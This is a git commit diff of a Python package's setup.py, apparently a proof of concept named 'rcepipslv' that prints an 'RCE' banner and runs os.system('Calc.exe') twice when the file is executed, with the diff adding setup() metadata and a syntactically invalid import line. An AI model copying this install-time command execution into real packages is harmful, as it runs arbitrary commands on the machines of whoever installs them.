bcb416a77f57582a83070af5363d5361398a1bde
slvignesh05 <123097688+slvignesh05@users.noreply.github.com>
2025-07-20 22:16:21 +0530

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,5 +1,12 @@
 import os
+import setuptools from setup
 
 print("RCE by w3shi(S.Lakshmi Vignesh")
 os.system("Calc.exe")
 os.system("Calc.exe")
+
+setup(
+    name="rcepipslv",
+    version="0.0.1",
+    py_modules=[],
+)
